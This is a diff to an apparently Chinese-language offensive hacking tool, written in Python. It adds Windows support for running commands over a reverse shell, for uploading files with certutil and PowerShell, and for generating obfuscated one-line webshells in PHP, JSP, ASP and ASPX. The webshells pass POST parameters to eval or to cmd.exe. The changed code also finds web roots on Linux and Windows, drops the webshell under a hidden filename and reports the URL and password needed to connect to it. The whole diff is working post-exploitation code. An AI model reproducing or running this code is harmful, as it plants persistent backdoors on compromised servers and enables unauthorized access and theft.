@@ -3051,13 +3051,14 @@ def ex_generic_shell(target, p):
 # 新增：自动识别 / 反弹 shell 通道文件传输 / 一句话木马落地
 # （半自动、默认安全：探测全自动跑；利用与拿 shell 必须显式 confirm）
 # ============================================================
-def _shell_run(sid, cmd, timeout=8.0, max_bytes=5_000_000):
-    """经已建立的反弹 shell 会话（原始交互式 bash 管道）执行命令并读回输出。
+def _shell_run(sid, cmd, timeout=8.0, max_bytes=5_000_000, sep=";"):
+    """经已建立的反弹 shell 会话（原始交互式 shell 管道）执行命令并读回输出。
 
-    交互式 bash 会回显敲入的命令行、并在末尾带提示符，直接用 recv 读到的内容里
+    交互式 shell 会回显敲入的命令行、并在末尾带提示符，直接用 recv 读到的内容里
     混着命令回显。这里用一对唯一标记把「真正输出」框起来：
-        echo __S_<随机>__; <cmd>; echo __E_<随机>__
+        echo __S_<随机>__ ; <cmd> ; echo __E_<随机>__
     取最后一个 __S__ 与最后一个 __E__ 之间的内容即为命令输出。
+    sep: 命令分隔符，bash 用 ";"（默认），Windows cmd.exe 用 "&"。
     返回 (text, err)；err 非 None 表示失败。
     """
     with SESS_LOCK:
@@ -3068,7 +3069,7 @@ def _shell_run(sid, cmd, timeout=8.0, max_bytes=5_000_000):
     m = os.urandom(8).hex()
     sm, em = "__S_" + m + "__", "__E_" + m + "__"
     try:
-        sock.sendall(("echo %s; %s; echo %s\n" % (sm, cmd, em)).encode())
+        sock.sendall(("echo %s%s %s%s echo %s\n" % (sm, sep, cmd, sep, em)).encode())
     except Exception as e:
         return None, "命令发送失败: %s" % e
     buf = b""
@@ -3212,6 +3213,10 @@ def _upload_bytes(sid, data, remote, target, p, notes):
                     srv.server_close()
                 except Exception:
                     pass
+    # Windows 目标（常见：既无 curl 也无 wget）→ 走 certutil / PowerShell，
+    # 绝不下发 base64 -d 、/tmp/... 这类 Linux 命令（在 Windows 上必然失败）
+    if _detect_shell_os(sid) == "windows":
+        return _upload_bytes_windows(sid, data, remote, timeout=to)
     # ② 回退：shell 通道 base64 分块（每块约 1KB，避开命令行长度上限；适合小文件）
     b = base64.b64encode(data).decode()
     chunk = 1024
@@ -3369,20 +3374,23 @@ def ex_shell_download(target, p):
             "detail": "\n".join(notes)}
 
 
-def _gen_webshell(lang, password, encoding):
-    """生成一句话木马源码。lang=php/jsp/asp；encoding=base64/xor/plain。
+def _gen_webshell(lang, password, encoding, key=None):
+    """生成一句话木马源码。lang=php/jsp/asp/aspx；encoding=base64/xor/plain。
+    key = xor 密钥（留空则用默认 dkx0r，保持向后兼容）。
     仅生成文本，不落地、不执行。返回 (code_text, ext)。"""
     pw = password or "dk"
     encoding = (encoding or "plain").strip().lower()
-    ext = {"php": ".php", "jsp": ".jsp", "asp": ".asp"}.get(lang, ".php")
+    xk = (key or "").strip() or "dkx0r"      # 四处 xor 密钥统一从这里取，别再硬编码
+    # C#/Java 字符串字面量里要转义反斜杠和双引号
+    esc = lambda s: (s or "").replace("\\", "\\\\").replace('"', '\\"')
+    ext = {"php": ".php", "jsp": ".jsp", "asp": ".asp", "aspx": ".aspx"}.get(lang, ".php")
     if lang == "php":
         if encoding == "base64":
             code = "<?php if(isset($_POST['%s'])){@eval(base64_decode($_POST['%s']));}?>" % (pw, pw)
         elif encoding == "xor":
-            key = "dkx0r"
             code = ("<?php $k='%s'; if(isset($_POST['%s'])){$d=base64_decode($_POST['%s']);"
                     "$c='';for($i=0;$i<strlen($d);$i++){$c.=$d[$i]^$k[$i%%strlen($k)];}@eval($c);}?>"
-                    % (key, pw, pw))
+                    % (xk, pw, pw))
         else:
             code = "<?php if(isset($_POST['%s'])){@eval($_POST['%s']);}?>" % (pw, pw)
     elif lang == "jsp":
@@ -3395,21 +3403,53 @@ def _gen_webshell(lang, password, encoding):
                     "while((n=is.read(b))!=-1)out.write(new String(b,0,n));} %%>" % pw)
         elif encoding == "xor":
             body = ("<%% String p=request.getParameter(\"%s\"); if(p!=null){byte[] db="
-                    "Base64.getDecoder().decode(p); String k=\"dkx0r\";byte[] cb="
+                    "Base64.getDecoder().decode(p); String k=\"%s\";byte[] cb="
                     "new byte[db.length]; for(int i=0;i<db.length;i++){cb[i]=(byte)"
                     "(db[i]^(byte)k.charAt(i%%k.length()));} String cmd=new String(cb);"
                     "Process pr=Runtime.getRuntime().exec(new String[]{\"sh\",\"-c\",cmd});"
                     "InputStream is=pr.getInputStream();byte[] b=new byte[8192];int n;"
-                    "while((n=is.read(b))!=-1)out.write(new String(b,0,n));} %%>" % pw)
+                    "while((n=is.read(b))!=-1)out.write(new String(b,0,n));} %%>" % (pw, xk))
         else:
             body = ("<%% String p=request.getParameter(\"%s\"); if(p!=null){"
                     "Process pr=Runtime.getRuntime().exec(new String[]{\"sh\",\"-c\",p});"
                     "InputStream is=pr.getInputStream();byte[] b=new byte[8192];int n;"
                     "while((n=is.read(b))!=-1)out.write(new String(b,0,n));} %%>" % pw)
         code = head + body
+    elif lang == "aspx":
+        # aspx 跑在 Windows / IIS 上 —— 用 cmd.exe /c 起进程并回显，**绝不能用 sh**
+        epw, ek = esc(pw), esc(xk)
+        head = "<%@ Page Language=\"C#\" %>\n"
+        if encoding == "base64":
+            dec = "    string cmd = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(p));\n"
+        elif encoding == "xor":
+            dec = ("    byte[] db = Convert.FromBase64String(p);\n"
+                   "    byte[] kb = System.Text.Encoding.UTF8.GetBytes(\"%s\");\n"
+                   "    byte[] cb = new byte[db.Length];\n"
+                   "    for (int i = 0; i < db.Length; i++) { cb[i] = (byte)(db[i] ^ kb[i %% kb.Length]); }\n"
+                   "    string cmd = System.Text.Encoding.UTF8.GetString(cb);\n" % ek)
+        else:
+            dec = "    string cmd = p;\n"
+        # 这段是常量（不参与 % 格式化），所以 % 不用转义
+        tail = (
+            "    System.Diagnostics.ProcessStartInfo psi = "
+            "new System.Diagnostics.ProcessStartInfo(\"cmd.exe\", \"/c \" + cmd);\n"
+            "    psi.UseShellExecute = false;\n"
+            "    psi.RedirectStandardOutput = true;\n"
+            "    psi.RedirectStandardError = true;\n"
+            "    System.Diagnostics.Process pr = System.Diagnostics.Process.Start(psi);\n"
+            "    string o = pr.StandardOutput.ReadToEnd() + pr.StandardError.ReadToEnd();\n"
+            "    pr.WaitForExit();\n"
+            "    Response.Write(o);\n"
+            "}\n"
+            "%>")
+        body = ("<%%\n"
+                "string p = Request[\"%s\"];\n"
+                "if (!string.IsNullOrEmpty(p))\n"
+                "{\n" % epw) + dec
+        code = head + body + tail
     else:  # asp：plain / base64 / xor 三种编码均真实生效（与 PHP/JSP 一致）
         # 与 PHP/JSP 共用同一把 xor 密钥，保证客户端编码逻辑一致
-        ASP_XOR_KEY = "dkx0r"
+        ASP_XOR_KEY = xk
         # base64：用 MSXML 做 base64 解码得到原始 VBScript 字节流，再 ExecuteGlobal
         asp_b64 = (
             "<%%\r\n"
@@ -3473,13 +3513,125 @@ def _gen_webshell(lang, password, encoding):
     return code, ext
 
 
+# ---- 跨平台 web 根候选（Windows 分支绝不能出现 find / 、sh -c 、ls）----
+_LINUX_WEBROOTS = [
+    "/var/www/html", "/var/www", "/usr/share/nginx/html", "/srv/www", "/data/www",
+    "/usr/local/tomcat/webapps/ROOT", "/opt/tomcat/webapps/ROOT",
+    "/usr/share/tomcat/webapps/ROOT", "/usr/share/tomcat9/webapps/ROOT",
+    "/var/lib/tomcat9/webapps/ROOT", "/var/lib/tomcat8/webapps/ROOT",
+    "/opt/app", "/app", "/www", "/home/wwwroot/default",
+]
+_WIN_WEBROOTS = [
+    "C:\\inetpub\\wwwroot", "C:\\xampp\\htdocs", "C:\\wamp\\www", "C:\\wamp64\\www",
+    "C:\\apache\\htdocs", "C:\\nginx\\html", "C:\\tomcat\\webapps\\ROOT",
+    "C:\\Program Files\\Apache Software Foundation\\Tomcat 9.0\\webapps\\ROOT",
+    "C:\\Program Files\\Apache Software Foundation\\Tomcat 8.5\\webapps\\ROOT",
+    "C:\\Program Files\\Apache Software Foundation\\Tomcat 10.0\\webapps\\ROOT",
+]
+
+
+def _win_webroot_probe():
+    """Windows web 根探测命令：单条 cmd 命令，for + %~d 去掉引号，不需要 & 串联。"""
+    items = " ".join('"%s"' % r for r in _WIN_WEBROOTS)
+    return 'for %d in (' + items + ') do @if exist "%~d\\." echo DK_ROOT:%~d'
+
+
+def _detect_shell_os(sid, timeout=6):
+    """经反弹 shell 判断目标 OS，返回 'linux' / 'windows' / ''（判不出来）。"""
+    out, _ = _shell_run(sid, "uname -s", timeout=timeout)
+    o = (out or "").lower()
+    if "linux" in o:
+        return "linux"
+    # Windows 上的 Git-Bash / Cygwin / MSYS 也走 uname：MINGW64_NT-10.0 / CYGWIN_NT-10.0
+    if "mingw" in o or "cygwin" in o or "msys" in o or "_nt-" in o:
+        return "windows"
+    out2, _ = _shell_run(sid, "ver", timeout=timeout)
+    if "windows" in (out2 or "").lower():
+        return "windows"
+    out3, _ = _shell_run(sid, "echo %OS%", timeout=timeout)
+    if "windows" in (out3 or "").lower():
+        return "windows"
+    return "linux" if o else ""      # 有 uname 输出但没匹配上 → 按 Linux 处理（旧行为）
+
+
+def _size_from_output(text):
+    """从落地校验命令的输出里解析文件大小；解析不出来返回 -1。"""
+    if not text:
+        return -1
+    for ln in text.splitlines():
+        ln = ln.strip()
+        if ln.startswith("DK_SIZE:"):
+            try:
+                return int(ln[8:].strip())
+            except Exception:
+                return -1
+    for ln in text.splitlines():
+        ln = ln.strip()
+        if not ln:
+            continue
+        first = ln.split()[0]
+        if first.isdigit():
+            return int(first)
+    return -1
+
+
+def _win_file_size(sid, remote):
+    """Windows 侧取文件大小（cmd for 的 %~zf），取不到返回 -1。"""
+    # 注意 %%f / %%~zf：这两个 % 都要转义，否则会被当成 %f(浮点) 格式符
+    out, _ = _shell_run(sid, 'for %%f in ("%s") do @echo DK_SIZE:%%~zf' % remote,
+                        timeout=8, sep="&")
+    return _size_from_output(out)
+
+
+def _upload_bytes_windows(sid, data, remote, timeout=30):
+    """Windows 目标落地文件：分块 echo 写 base64 → certutil -decode → PowerShell 兜底。
+
+    目标上既没有 curl 也没有 wget 时（Windows 很常见）走这条。全程只用 cmd /
+    PowerShell 内建能力，绝不下发 base64 -d 、/tmp/... 这类 Linux 命令。
+    """
+    b = base64.b64encode(data).decode()
+    tmp = "%%TEMP%%\\.dk_up_%s.b64" % os.urandom(4).hex()
+    notes = []
+    chunk = 512                      # 避开 cmd 命令行长度上限
+    n = 0
+    while n < len(b):
+        # base64 字符集里没有 cmd 元字符，可以直接 echo 追加
+        _, e = _shell_run(sid, "echo %s>>%s" % (b[n:n + chunk], tmp), timeout=8, sep="&")
+        if e:
+            return {"ok": False, "output": "Windows 分块写入中断: %s" % e,
+                    "detail": "\n".join(notes)}
+        n += chunk
+    _shell_run(sid, "certutil -decode %s %s" % (tmp, remote),
+               timeout=max(10.0, float(timeout)), sep="&")
+    sz = _win_file_size(sid, remote)
+    if sz != len(data):
+        notes.append("certutil -decode 未得到预期大小（%s 字节），改用 PowerShell 兜底"
+                     % (sz if sz >= 0 else "未知"))
+        _shell_run(sid,
+                   "powershell -nop -c \"[IO.File]::WriteAllBytes('%s',"
+                   "[Convert]::FromBase64String([IO.File]::ReadAllText('%s')))\""
+                   % (remote, tmp), timeout=max(15.0, float(timeout)), sep="&")
+        sz = _win_file_size(sid, remote)
+    _shell_run(sid, "del /f /q %s" % tmp, timeout=6, sep="&")
+    if sz == len(data):
+        notes.append("方式=Windows(certutil/PowerShell 解码 base64)，%d 块"
+                     % ((len(b) + chunk - 1) // chunk))
+        return {"ok": True, "output": "上传成功: %s (%d 字节)" % (remote, len(data)),
+                "detail": "\n".join(notes)}
+    return {"ok": False,
+            "output": "上传校验失败: 期望 %d 字节，实际 %s 字节（certutil 与 PowerShell 都没成功）"
+                      % (len(data), sz if sz >= 0 else "未知"),
+            "detail": "\n".join(notes)}
+
+
 def ex_webshell_drop(target, p):
     """拿到 shell 后，向目标 web 根写入一句话木马（功能 C）。
 
-    参数: sid(必填), lang(php/jsp/asp), password(连接密码), encoding(base64/xor/plain),
-          webroot(可选, 留空自动探测常见 web 根), context(可选, URL上下文路径),
+    参数: sid(必填), lang(php/jsp/asp/aspx), password(连接密码), key(xor密钥, 默认 dkx0r),
+          encoding(base64/xor/plain), webroot(可选, 留空则按目标 OS 自动探测),
+          context(可选, URL上下文路径, 留空则从 webapps/<app> 自动推断),
           filename(可选), lhost/port(可选, 上传加速用), timeout(可选)。
-    ★ 只落地文件并报告路径/候选 URL，不自动执行任何破坏动作。
+    ★ 只落地文件并报告 路径 / 口令 / xor密钥 / 访问地址，不自动执行任何破坏动作。
     """
     sid = (p.get("sid") or "").strip()
     if not sid:
@@ -3487,75 +3639,149 @@ def ex_webshell_drop(target, p):
     if not STATE["sessions"].get(sid):
         return {"ok": False, "output": "会话不存在（先用 Shiro / XStream 的 shell 模式把目标打上线）"}
     lang = (p.get("lang") or "php").strip().lower()
-    if lang not in ("php", "jsp", "asp"):
-        return {"ok": False, "output": "lang 仅支持 php / jsp / asp"}
+    if lang not in ("php", "jsp", "asp", "aspx"):
+        return {"ok": False, "output": "lang 仅支持 php / jsp / asp / aspx"}
     pw = (p.get("password") or "dk").strip() or "dk"
+    xk = (p.get("key") or "").strip() or "dkx0r"
     enc = (p.get("encoding") or "plain").strip().lower()
     to = float(p.get("timeout") or 20)
 
-    code, ext = _gen_webshell(lang, pw, enc)
+    code, ext = _gen_webshell(lang, pw, enc, key=xk)
     data = code.encode("utf-8")
 
-    # 探测 web 根
+    notes = []
+    # ① 先判目标 OS —— 后面探测命令、路径分隔符、上传方式全都依赖它
+    os_kind = _detect_shell_os(sid)
+    win = (os_kind == "windows")
+    sep = "&" if win else ";"          # cmd.exe 用 & 串联，bash 用 ;
+    notes.append("目标 OS 判定: %s" % (os_kind or "未判出（按 Linux 处理）"))
+
+    # ② 探测 web 根（跨平台：Windows 走 if exist/dir，绝不出现 find / 、sh -c 、ls）
     webroot = (p.get("webroot") or "").strip()
-    candidates = ["/var/www/html", "/usr/local/tomcat/webapps/ROOT",
-                  "/opt/tomcat/webapps/ROOT", "/srv/www",
-                  "/var/lib/tomcat9/webapps/ROOT", "/var/lib/tomcat8/webapps/ROOT",
-                  "/usr/share/tomcat/webapps/ROOT", "/app", "/www", "/data/www"]
     found_roots = []
     if webroot:
         found_roots = [webroot]
+    elif win:
+        out, _ = _shell_run(sid, _win_webroot_probe(), timeout=10, sep=sep)
+        for line in (out or "").splitlines():
+            line = line.strip()
+            if line.startswith("DK_ROOT:"):
+                found_roots.append(line[8:].strip())
     else:
-        probe = "for d in %s; do [ -d \"$d\" ] && echo \"DK_ROOT:$d\"; done" % " ".join(candidates)
-        out, _ = _shell_run(sid, probe, timeout=8)
-        if out:
-            for line in out.splitlines():
-                line = line.strip()
-                if line.startswith("DK_ROOT:"):
-                    found_roots.append(line[8:])
-        if not found_roots:       # 再尝试自动找 tomcat ROOT
-            out2, _ = _shell_run(sid, "find / -maxdepth 5 -type d -name ROOT 2>/dev/null | head -5",
-                                 timeout=10)
-            if out2:
-                found_roots = [x.strip() for x in out2.splitlines() if x.strip()]
+        probe = ("for d in %s; do [ -d \"$d\" ] && echo \"DK_ROOT:$d\"; done"
+                 % " ".join(_LINUX_WEBROOTS))
+        out, _ = _shell_run(sid, probe, timeout=9)
+        for line in (out or "").splitlines():
+            line = line.strip()
+            if line.startswith("DK_ROOT:"):
+                found_roots.append(line[8:])
+        if not found_roots:
+            # 候选都没命中 → 从进程命令行推断 tomcat 家目录（比 find / 快且不惊动目标）
+            psout, _ = _shell_run(
+                sid,
+                "ps -eo args 2>/dev/null | grep -oE '(catalina\\.home|catalina\\.base)=[^ ]+' | head -5",
+                timeout=10)
+            extra = []
+            for ln in (psout or "").splitlines():
+                if "=" in ln:
+                    v = ln.split("=", 1)[1].strip()
+                    if v:
+                        extra.append(v + "/webapps/ROOT")
+            if extra:
+                out2, _ = _shell_run(
+                    sid,
+                    "for d in %s; do [ -d \"$d\" ] && echo \"DK_ROOT:$d\"; done" % " ".join(extra),
+                    timeout=8)
+                for line in (out2 or "").splitlines():
+                    line = line.strip()
+                    if line.startswith("DK_ROOT:"):
+                        found_roots.append(line[8:])
     if not found_roots:
+        cands = _WIN_WEBROOTS if win else _LINUX_WEBROOTS
         return {"ok": False,
                 "output": "未探测到常见 web 根目录；请用 webroot 参数手动指定",
-                "detail": "探测过: " + ", ".join(candidates)}
+                "detail": "目标 OS: %s\n探测过:\n%s" % (os_kind or "未知",
+                                                        "\n".join(cands))}
 
     root = found_roots[0]
     fname = (p.get("filename") or "").strip() or (".dk_%s%s" % (os.urandom(4).hex(), ext))
-    remote = "%s/%s" % (root.rstrip("/"), fname.lstrip("/"))
+    if win:
+        remote = root.rstrip("\\/") + "\\" + fname.lstrip("/\\")
+    else:
+        remote = "%s/%s" % (root.rstrip("/"), fname.lstrip("/"))
 
-    up = _upload_bytes(sid, data, remote, target, p, [])
+    # ③ 落地
+    up = _upload_bytes(sid, data, remote, target, p, notes)
     if not up.get("ok"):
-        up["detail"] = ("web 根探测到: %s\n" % root) + (up.get("detail") or "")
+        up["detail"] = ("目标 OS: %s\nweb 根探测到: %s\n" % (os_kind or "未知", root)) \
+                       + (up.get("detail") or "")
+        up["webroot"] = root
         return up
 
-    # 回显可访问 URL（结合目标 scheme://host 与可选 context 推测）
+    # ④ 落地后确认：目标侧文件大小必须等于 len(data)，不一致就直接报失败
+    if win:
+        vout, _ = _shell_run(sid, 'for %%f in ("%s") do @echo DK_SIZE:%%~zf' % remote,
+                             timeout=8, sep=sep)
+    else:
+        vout, _ = _shell_run(
+            sid, "stat -c %%s %s 2>/dev/null || wc -c < %s 2>/dev/null || echo DK_NOFILE"
+                 % (remote, remote), timeout=8)
+    got = _size_from_output(vout)
+    if got != len(data):
+        return {"ok": False,
+                "output": "落地校验失败: 期望 %d 字节，目标实际 %s 字节"
+                          % (len(data), got if got >= 0 else "未知"),
+                "webroot": root,
+                "detail": ("目标 OS: %s\n落地路径: %s\nweb 根: %s\n"
+                           "校验命令输出: %s\n%s"
+                           % (os_kind or "未知", remote, root,
+                              (vout or "(空)").strip()[:400], "\n".join(notes)))}
+
+    # ⑤ URL：context 用户手填优先，否则从 .../webapps/<app> 自动推断
+    ctx = (p.get("context") or "").strip().strip("/")
+    if not ctx:
+        m = re.search(r"/webapps/([^/]+)$", root.replace("\\", "/").rstrip("/"))
+        if m:
+            app = m.group(1)
+            ctx = "" if app.upper() == "ROOT" else app
     urls = []
+    root_url = ""
     try:
         root_url = get_root(normalize(target))
     except Exception:
         root_url = ""
-    ctx = (p.get("context") or "").strip().strip("/")
     if root_url:
+        urls.append("%s%s/%s" % (root_url, ("/" + ctx) if ctx else "", fname))
         if ctx:
-            urls.append("%s/%s/%s" % (root_url, ctx, fname))
-        urls.append("%s/%s" % (root_url, fname))
+            urls.append("%s/%s" % (root_url, fname))
+    primary = urls[0] if urls else ""
+    notes.append("落地校验: 目标侧 %d 字节，与本地一致" % got)
+
     return {
         "ok": True,
-        "output": "一句话木马已落地: %s（%s, 密码=%s, 加密=%s）" % (remote, lang.upper(), pw, enc),
+        "output": "一句话木马已落地【POST/GET 参数名(口令)=%s，xor密钥=%s，加密=%s】访问地址=%s"
+                  % (pw, xk, enc, primary or "(未知，见 detail)"),
         "remote": remote,
         "webroot": root,
+        "url": primary,
         "urls": urls,
         "encoding": enc,
         "password": pw,
-        "detail": ("落地路径: %s\n探测到的 web 根: %s\n候选可访问 URL:\n%s\n"
-                   "★ 仅落地文件，未执行任何破坏动作；请用对应 webshell 客户端（密码=%s，加密=%s）连接验证。\n"
-                   "★ 实际 URL 取决于目标上下文路径，若猜测不准请手动拼（如 %s/<上下文>/%s）。"
-                   % (remote, root, "\n".join(urls) or "(无法推测，需手动拼)",
-                      pw, enc, root_url or "http://目标", fname)),
+        "key": xk,
+        "os": os_kind,
+        "lang": lang,
+        "detail": ("落地路径  : %s\n"
+                   "目标 OS   : %s\n"
+                   "web 根    : %s\n"
+                   "主访问地址: %s\n"
+                   "候选地址  : %s\n"
+                   "★ 连接参数：参数名(口令) = %s ，加密方式 = %s ，xor 密钥 = %s\n"
+                   "★ 仅落地文件，未执行任何破坏动作；用对应客户端按上面的口令连接即可。\n"
+                   "★ 若地址不准，多半是上下文路径问题，可手动拼 %s/<上下文>/%s\n%s"
+                   % (remote, os_kind or "未知", root,
+                      primary or "(无法推测)", "\n".join(urls) or "(无)",
+                      pw, enc, xk, root_url or "http://目标", fname,
+                      "\n" + "\n".join(notes))),
     }
 
 
